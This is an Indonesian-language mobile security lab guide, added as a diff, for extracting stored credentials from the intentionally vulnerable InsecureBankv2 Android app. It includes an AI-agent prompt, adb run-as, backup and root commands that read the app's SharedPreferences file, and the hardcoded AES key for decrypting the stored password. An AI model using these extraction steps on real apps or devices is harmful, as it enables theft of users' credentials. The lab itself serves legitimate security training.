@@ -1,0 +1,142 @@
+# Lab 3: Insecure Local Storage — Prompt Eksekusi
+
+## Tujuan
+Mendemonstrasikan celah insecure storage (CWE-312, CWE-321, CWE-200) pada aplikasi Android InsecureBankv2
+di mana kredensial pengguna disimpan secara tidak aman di SharedPreferences dengan proteksi lemah.
+
+## Target
+- APK: InsecureBankv2.apk
+- Package: com.android.insecurebankv2
+- Source: https://github.com/dineshshetty/Android-InsecureBankv2
+
+---
+
+## Prompt Cepat untuk AI Agent
+
+```
+Jalankan Lab 3 - Insecure Local Storage pada APK InsecureBankv2:
+
+1. Dekompilasi APK yang ada di Mobile-userfull/apk/InsecureBankv2.apk
+   menggunakan JADX ke folder Insecure-Local-Storage/decompiled/
+
+2. Cari dan analisis mekanisme penyimpanan data sensitif:
+   a. Cari kata kunci SharedPreferences di seluruh source code
+   b. Analisis DoLogin.java → fungsi saveCreds()
+   c. Analisis CryptoClass.java → mekanisme enkripsi password
+   d. Cari flag MODE_WORLD_READABLE
+
+3. Identifikasi 3 vektor ekstraksi:
+   a. run-as (debggable=true) — ekstrak mySharedPreferences.xml
+   b. adb backup (allowBackup=true) — backup data aplikasi
+   c. Mode WORLD_READABLE — aplikasi lain dapat membaca file
+
+4. Analisis kekuatan proteksi data:
+   a. Username: HANYA Base64 (bukan enkripsi)
+   b. Password: AES-256 dengan kunci hardcoded + IV all-zeros
+   c. File permission: rw-rw-rw- (world-readable)
+
+5. Jalankan PoC exploit:
+   adb shell run-as com.android.insecurebankv2 cat \
+       /data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml
+
+6. Tulis laporan lengkap di reports/report.md
+```
+
+---
+
+## Langkah Eksekusi
+
+### Step 1: Setup & Dekompilasi
+```
+$env:JAVA_HOME = "C:\jdk-17"
+& "C:\jadx\bin\jadx.bat" -d "<WORKDIR>\decompiled" "<APK>"
+```
+
+### Step 2: Cari SharedPreferences di App Namespace
+```
+grep -rn "getSharedPreferences\|SharedPreferences\|putString\|editor.commit\|MODE_WORLD" \
+    decompiled/sources/com/android/insecurebankv2/
+```
+
+### Step 3: Analisis saveCreds() di DoLogin.java
+```
+DoLogin.java:140 — mode 0 (MODE_PRIVATE)
+DoLogin.java:144 — Base64.encode (bukan enkripsi!)
+DoLogin.java:146 — aesEncryptedString (kunci hardcoded)
+DoLogin.java:147 — putString("EncryptedUsername", base64Username)
+DoLogin.java:148 — putString("superSecurePassword", encryptedPassword)
+```
+
+### Step 4: Identifikasi MODE_WORLD_READABLE di MyBroadCastReceiver.java
+```
+MyBroadCastReceiver.java:21 — context.getSharedPreferences("mySharedPreferences", 1)
+                                                                             ^
+                                                MODE_WORLD_READABLE (deprecated!)
+```
+
+### Step 5: Analisis CryptoClass.java
+```
+CryptoClass.java:22 — String key = "This is the super secret key 123";
+CryptoClass.java:23 — byte[] ivBytes = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
+```
+
+### Step 6: PoC — Ekstrak File SharedPreferences
+
+**Vektor 1: run-as (debuggable=true, tanpa root)**
+```
+adb shell run-as com.android.insecurebankv2 cat \
+    /data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml
+```
+
+**Vektor 2: adb backup**
+```
+adb backup -f backup.ab com.android.insecurebankv2
+```
+
+**Vektor 3: Root access (perangkat rooted)**
+```
+adb shell
+su
+cat /data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml
+```
+
+### Step 7: Decode & Dekripsi Data
+- Decode Base64 username: `echo "BASE64STRING" | base64 -d`
+- Dekripsi password menggunakan kunci hardcoded "This is the super secret key 123"
+- IV: all zeros (16 bytes)
+
+---
+
+## Expected Output
+- 4 temuan insecure storage terkonfirmasi
+- Laporan dalam format markdown (.md)
+- PoC command adb shell tervalidasi
+- Struktur artefak lengkap di direktori Mobile-userfull/Insecure-Local-Storage/
+
+## Expected Findings
+
+| ID | Komponen | Severity | CWE |
+|----|----------|----------|-----|
+| ISB-STORAGE-001 | Username Base64 di SharedPreferences | High | CWE-312 |
+| ISB-STORAGE-002 | AES key hardcoded + IV all zeros | Critical | CWE-321/325 |
+| ISB-STORAGE-003 | MODE_WORLD_READABLE di MyBroadCastReceiver | High | CWE-200 |
+| ISB-STORAGE-004 | debuggable=true + allowBackup=true | Medium | CWE-215 |
+
+## Checklist Verifikasi
+- [ ] APK berhasil didekompilasi
+- [ ] Fungsi saveCreds() teridentifikasi dan dianalisis
+- [ ] Semua file yang menggunakan SharedPreferences teridentifikasi
+- [ ] MODE_WORLD_READABLE (mode=1) ditemukan di MyBroadCastReceiver
+- [ ] Hardcoded AES key dan IV terdokumentasi
+- [ ] 3 vektor ekstraksi tervalidasi
+- [ ] Data kredensial berhasil diekstrak via run-as
+- [ ] Report.md dibuat dengan format lengkap
+- [ ] Semua artefak tersimpan di Insecure-Local-Storage/
+
+---
+
+## Catatan Penting
+- MODE_WORLD_READABLE sudah deprecated sejak API 17 dan SecurityException on API 24+
+- Namun karena targetSdkVersion=22, flag ini masih berlaku
+- Base64 BUKAN enkripsi — hanya encoding yang trivial untuk direverse
+- Kunci hardcoded dapat diekstrak oleh siapa pun yang mendekompilasi APK
